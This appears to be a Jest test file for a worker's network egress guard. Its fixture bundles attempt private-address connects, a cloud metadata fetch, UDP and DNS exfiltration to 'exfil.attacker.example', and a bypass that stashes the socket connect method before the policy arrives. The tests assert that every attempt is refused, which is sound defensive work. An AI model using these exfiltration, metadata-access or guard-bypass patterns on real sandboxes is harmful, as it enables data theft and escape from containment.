// Egress policy over the worker boundary, on offline fixture bundles: the
// piece's own HTTP client is what gets refused, at the socket.
import http from "node:http";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  PieceWorker,
  PieceWorkerError,
} from "../../src/activepieces/worker/host.js";
import type { EgressPolicy } from "../../src/activepieces/worker/protocol.js";
import {
  isEgressDenied,
  isPrivateAddress,
  parseAddress,
} from "../../src/activepieces/worker/egress.js";

// Every action reports the failure rather than throwing, so the assertions can
// read the message the piece would have caught.
const FIXTURE = `
const net = require("node:net");
const dgram = require("node:dgram");
const dns = require("node:dns");
const dnsPromises = require("node:dns/promises");

async function report(fn) {
  try {
    return { ok: true, value: await fn() };
  } catch (error) {
    const cause = error && error.cause;
    return {
      ok: false,
      name: error.name,
      code: error.code,
      message: String(error.message),
      causeName: cause ? cause.name : undefined,
      causeCode: cause ? cause.code : undefined,
      causeMessage: cause ? String(cause.message) : undefined,
    };
  }
}

function rawConnect(port, host) {
  return new Promise((resolve, reject) => {
    const socket = net.connect(host === undefined ? { port } : { port, host });
    socket.once("connect", () => {
      socket.destroy();
      resolve("connected");
    });
    socket.once("error", (error) => {
      socket.destroy();
      reject(error);
    });
  });
}

const app = {
  displayName: "Egress Fixture",
  actions: {
    fetchUrl: {
      name: "fetchUrl",
      displayName: "Fetch",
      props: {},
      run: (ctx) =>
        report(async () => {
          const response = await fetch(ctx.propsValue.url);
          return { status: response.status, body: await response.text() };
        }),
    },
    connect: {
      name: "connect",
      displayName: "Connect",
      props: {},
      run: (ctx) =>
        report(() => rawConnect(ctx.propsValue.port, ctx.propsValue.host)),
    },
    propagate: {
      name: "propagate",
      displayName: "Propagate",
      props: {},
      run: (ctx) => rawConnect(ctx.propsValue.port, ctx.propsValue.host),
    },
    hostless: {
      name: "hostless",
      displayName: "Hostless",
      props: {},
      run: (ctx) => report(() => rawConnect(ctx.propsValue.port, undefined)),
    },
    udp: {
      name: "udp",
      displayName: "UDP",
      props: {},
      run: (ctx) =>
        report(
          () =>
            new Promise((resolve, reject) => {
              const socket = dgram.createSocket("udp4");
              socket.send(
                Buffer.from("leak"),
                ctx.propsValue.port,
                ctx.propsValue.host,
                (error) => {
                  socket.close();
                  if (error) reject(error);
                  else resolve("sent");
                },
              );
            }),
        ),
    },
    listen: {
      name: "listen",
      displayName: "Listen",
      props: {},
      run: () =>
        report(
          () =>
            new Promise((resolve, reject) => {
              const server = net.createServer();
              server.once("listening", () => {
                server.close();
                resolve("listening");
              });
              server.once("error", (error) => {
                server.close();
                reject(error);
              });
              server.listen(0, "127.0.0.1");
            }),
        ),
    },
    leaveBehind: {
      name: "leaveBehind",
      displayName: "Leave behind",
      props: {},
      run: (ctx) => {
        const port = ctx.propsValue.port;
        globalThis.__leftover = new Promise((resolve) => {
          setTimeout(() => {
            rawConnect(port, "127.0.0.1").then(
              (value) => resolve(String(value)),
              (error) => resolve(error.name + ": " + error.message),
            );
          }, 20);
        });
        return Promise.resolve({ ok: true, value: "scheduled" });
      },
    },
    collect: {
      name: "collect",
      displayName: "Collect",
      props: {},
      run: async () => ({ ok: true, value: await globalThis.__leftover }),
    },
    resolveTxt: {
      name: "resolveTxt",
      displayName: "Resolve TXT",
      props: {},
      run: (ctx) =>
        report(
          () =>
            new Promise((resolve, reject) => {
              dns.resolveTxt(ctx.propsValue.host, (error, records) => {
                if (error) reject(error);
                else resolve(records);
              });
            }),
        ),
    },
    resolveMxPromise: {
      name: "resolveMxPromise",
      displayName: "Resolve MX",
      props: {},
      run: (ctx) => report(() => dnsPromises.resolveMx(ctx.propsValue.host)),
    },
    resolverInstance: {
      name: "resolverInstance",
      displayName: "Resolver instance",
      props: {},
      run: (ctx) =>
        report(
          () =>
            new Promise((resolve, reject) => {
              new dns.Resolver().resolve4(ctx.propsValue.host, (error, a) => {
                if (error) reject(error);
                else resolve(a);
              });
            }),
        ),
    },
  },
};
module.exports = { app };
`;

// The attack the guard has to survive: module-level code, which runs on the
// first (policy-free) request, keeps the socket layer for a later policed run.
const STASH_FIXTURE = `
const net = require("node:net");
globalThis.__stolenConnect = net.Socket.prototype.connect;

const app = {
  displayName: "Stash Fixture",
  actions: {
    reuse: {
      name: "reuse",
      displayName: "Reuse",
      props: {},
      run: (ctx) =>
        new Promise((resolve) => {
          try {
            net.Socket.prototype.connect = function fake() {
              return this;
            };
          } catch (error) {
            // Sealed property: the assignment is refused either way.
          }
          const swapped = net.Socket.prototype.connect.name === "fake";
          const socket = new net.Socket();
          socket.once("connect", () => {
            socket.destroy();
            resolve({ ok: true, swapped, value: "connected" });
          });
          socket.once("error", (error) => {
            socket.destroy();
            resolve({
              ok: false,
              swapped,
              name: error.name,
              code: error.code,
              message: String(error.message),
            });
          });
          globalThis.__stolenConnect.call(socket, {
            port: ctx.propsValue.port,
            host: "127.0.0.1",
          });
        }),
    },
  },
};
module.exports = { app };
`;

interface Failure {
  ok: false;
  name: string;
  code?: string;
  message: string;
  causeName?: string;
  causeCode?: string;
  causeMessage?: string;
}

interface Success {
  ok: true;
  value: { status: number; body: string } | string;
}

let cacheDir = "";
let bundleDir = "";
let worker: PieceWorker;
let server: http.Server;
let port = 0;

describe("worker egress policy", () => {
  beforeAll(async () => {
    cacheDir = await mkdtemp(join(tmpdir(), "ap-worker-egress-"));
    bundleDir = join(cacheDir, "egress");
    await mkdir(bundleDir, { recursive: true });
    await writeFile(
      join(bundleDir, "package.json"),
      JSON.stringify({ name: "egress", version: "1.0.0", main: "index.js" }),
    );
    await writeFile(join(bundleDir, "index.js"), FIXTURE);
    server = http.createServer((_req, res) => {
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("allowed");
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    port = (server.address() as AddressInfo).port;
    worker = new PieceWorker();
  });

  afterAll(async () => {
    worker.dispose();
    await new Promise((resolve) => server.close(resolve));
    await rm(cacheDir, { recursive: true, force: true });
  });

  async function run(
    actionName: string,
    propsValue: Record<string, unknown>,
    egress?: EgressPolicy,
  ): Promise<Failure | Success> {
    const result = await worker.runAction({
      bundleDir,
      actionName,
      propsValue,
      ...(egress ? { egress } : {}),
    });
    return result.output as Failure | Success;
  }

  it("blocks a connection to private address space", async () => {
    const output = (await run(
      "connect",
      { host: "10.1.2.3", port: 80 },
      {},
    )) as Failure;

    expect(output.ok).toBe(false);
    expect(output.name).toBe("EgressDeniedError");
    expect(output.code).toBe("EGRESS_DENIED");
    expect(output.message).toContain("10.1.2.3");
  });

  it("blocks the cloud metadata endpoint, whichever client asks", async () => {
    const output = (await run(
      "fetchUrl",
      { url: "http://169.254.169.254/latest/meta-data/" },
      {},
    )) as Failure;

    expect(output.ok).toBe(false);
    // undici reports it as "fetch failed" and keeps the denial as the cause.
    expect(output.causeCode ?? output.code).toBe("EGRESS_DENIED");
    expect(`${output.message} ${output.causeMessage ?? ""}`).toContain(
      "169.254.169.254",
    );
  });

  it("blocks an IPv4-mapped IPv6 form of the metadata endpoint", async () => {
    const output = (await run(
      "connect",
      { host: "::ffff:169.254.169.254", port: 80 },
      {},
    )) as Failure;

    expect(output.ok).toBe(false);
    expect(output.code).toBe("EGRESS_DENIED");
  });

  it("allows a host the policy names, with its address exempted", async () => {
    const output = (await run(
      "fetchUrl",
      { url: `http://127.0.0.1:${port}/` },
      { allowHosts: ["127.0.0.1"], allowAddresses: ["127.0.0.1/32"] },
    )) as Success;

    expect(output.ok).toBe(true);
    expect(output.value).toEqual({ status: 200, body: "allowed" });
  });

  it("refuses a host that is not on the allowlist", async () => {
    const output = (await run(
      "connect",
      { host: "127.0.0.1", port },
      { allowHosts: ["api.example.com"], allowAddresses: ["127.0.0.1/32"] },
    )) as Failure;

    expect(output.ok).toBe(false);
    expect(output.message).toContain("127.0.0.1");
    expect(output.message).toContain("allowlist");
  });

  it("classifies the resolved address, not the name the piece asked for", async () => {
    // "localhost" is on the allowlist and resolves to loopback, which is not:
    // the same shape as a rebinding record pointing at private space.
    const output = (await run(
      "connect",
      { host: "localhost", port },
      { allowHosts: ["localhost"] },
    )) as Failure;

    expect(output.ok).toBe(false);
    expect(output.code).toBe("EGRESS_DENIED");
    expect(output.message).toContain("localhost");
    expect(output.message).toContain("resolves to");
  });

  it("refuses a port outside the policy", async () => {
    const output = (await run(
      "connect",
      { host: "127.0.0.1", port },
      {
        allowHosts: ["127.0.0.1"],
        allowAddresses: ["127.0.0.1/32"],
        allowPorts: [443],
      },
    )) as Failure;

    expect(output.ok).toBe(false);
    expect(output.message).toContain("is not permitted");
  });

  it("leaves egress unrestricted when the request carries no policy", async () => {
    const output = (await run("fetchUrl", {
      url: `http://127.0.0.1:${port}/`,
    })) as Success;

    expect(output.ok).toBe(true);
    expect(output.value).toEqual({ status: 200, body: "allowed" });
  });

  it("fails the request outright on a malformed policy", async () => {
    await expect(
      run("connect", { host: "127.0.0.1", port }, { allowAddresses: ["nope"] }),
    ).rejects.toThrow(/not an IP address/);
  });

  it("surfaces a denial to the host as its own failure class", async () => {
    const denial = await worker
      .runAction({
        bundleDir,
        actionName: "propagate",
        propsValue: { host: "192.168.0.5", port: 8080 },
        egress: {},
      })
      .catch((error: unknown) => error);

    expect(denial).toBeInstanceOf(PieceWorkerError);
    expect(isEgressDenied(denial)).toBe(true);
    const { serialized } = denial as PieceWorkerError;
    expect(serialized.name).toBe("EgressDeniedError");
    expect(serialized.properties.code).toBe("EGRESS_DENIED");
    expect(serialized.properties.address).toBe("192.168.0.5");
  });

  it("blocks a connect that names no host at all", async () => {
    // Node resolves the missing host to localhost itself; the guard has to
    // default it too, or loopback is reachable under the default policy.
    const output = (await run("hostless", { port }, {})) as Failure;

    expect(output.ok).toBe(false);
    expect(output.code).toBe("EGRESS_DENIED");
    expect(output.message).toContain("localhost");
    // From the guarded lookup, so the default was written back into the
    // options rather than only consulted by the host check.
    expect(output.message).toContain("resolves to");
  });

  it("blocks a UDP send, which is a route out the TCP guard never sees", async () => {
    const output = (await run(
      "udp",
      { host: "10.1.2.3", port: 53 },
      {},
    )) as Failure;

    expect(output.ok).toBe(false);
    expect(output.code).toBe("EGRESS_DENIED");
    expect(output.message).toContain("10.1.2.3");
  });

  it("blocks a DNS query, where the data rides in the name", async () => {
    const output = (await run(
      "resolveTxt",
      { host: "exfil.attacker.example" },
      {},
    )) as Failure;

    expect(output.ok).toBe(false);
    expect(output.code).toBe("EGRESS_DENIED");
    expect(output.message).toContain("exfil.attacker.example");
  });

  it("blocks the promise and Resolver forms of the same query", async () => {
    const promised = (await run(
      "resolveMxPromise",
      { host: "exfil.attacker.example" },
      {},
    )) as Failure;
    const instance = (await run(
      "resolverInstance",
      { host: "exfil.attacker.example" },
      {},
    )) as Failure;

    expect(promised.code).toBe("EGRESS_DENIED");
    expect(instance.code).toBe("EGRESS_DENIED");
  });

  it("still resolves a permitted hostname for the piece's own request", async () => {
    // The guard's lookups go to getaddrinfo directly, so refusing c-ares must
    // not cost a piece the ordinary name it was allowed to reach.
    const output = (await run(
      "fetchUrl",
      { url: `http://localhost:${port}/` },
      { allowHosts: ["localhost"], allowAddresses: ["127.0.0.1/32"] },
    )) as Success;

    expect(output.ok).toBe(true);
    expect(output.value).toEqual({ status: 200, body: "allowed" });
  });

  it("blocks a piece listening for inbound connections", async () => {
    const output = (await run("listen", {}, {})) as Failure;

    expect(output.ok).toBe(false);
    expect(output.code).toBe("EGRESS_DENIED");
    expect(output.message).toContain("listening");
  });

  it("keeps leftover work under the policy it was started with", async () => {
    const scheduled = (await run("leaveBehind", { port }, {})) as Success;
    expect(scheduled.value).toBe("scheduled");

    // The second request carries no policy at all; the timer the first one
    // left behind must still be refused.
    const collected = (await run("collect", {})) as Success;
    expect(collected.value as string).toContain("Egress denied");
  });

  it("refuses a socket layer stashed before any policy arrived", async () => {
    const stashDir = join(cacheDir, "stash");
    await mkdir(stashDir, { recursive: true });
    await writeFile(
      join(stashDir, "package.json"),
      JSON.stringify({ name: "stash", version: "1.0.0", main: "index.js" }),
    );
    await writeFile(join(stashDir, "index.js"), STASH_FIXTURE);

    // Its own child, so the policy-free describe below really is this
    // worker's first request and nothing has armed the guard before it.
    const fresh = new PieceWorker();
    let output: Failure & { swapped: boolean };
    try {
      // A design-time request carries no policy and loads the module, whose
      // top-level code grabs the socket layer and keeps it for later.
      await fresh.describePiece({
        bundleDir: stashDir,
        packageName: "@test/stash",
        version: "1.0.0",
      });
      const result = await fresh.runAction({
        bundleDir: stashDir,
        actionName: "reuse",
        propsValue: { port },
        egress: {},
      });
      output = result.output as Failure & { swapped: boolean };
    } finally {
      fresh.dispose();
    }

    expect(output.ok).toBe(false);
    expect(output.code).toBe("EGRESS_DENIED");
    // And the prototype could not be swapped back to an unguarded one.
    expect(output.swapped).toBe(false);
  });
});

describe("address classification", () => {
  it("treats the private ranges and their v6 forms as private", () => {
    for (const address of [
      "127.0.0.1",
      "10.0.0.1",
      "172.16.4.5",
      "192.168.1.1",
      "169.254.169.254",
      "100.64.0.1",
      "::1",
      "fd00::1",
      "fe80::1",
      "::ffff:127.0.0.1",
    ]) {
      expect(isPrivateAddress(address)).toBe(true);
    }
  });

  it("leaves public addresses alone", () => {
    for (const address of ["8.8.8.8", "1.1.1.1", "93.184.216.34", "2606:4700::1"]) {
      expect(isPrivateAddress(address)).toBe(false);
    }
  });

  it("refuses to classify a non-address, which the guard reads as private", () => {
    expect(parseAddress("not-an-address")).toBeUndefined();
    expect(isPrivateAddress("not-an-address")).toBe(true);
  });
});
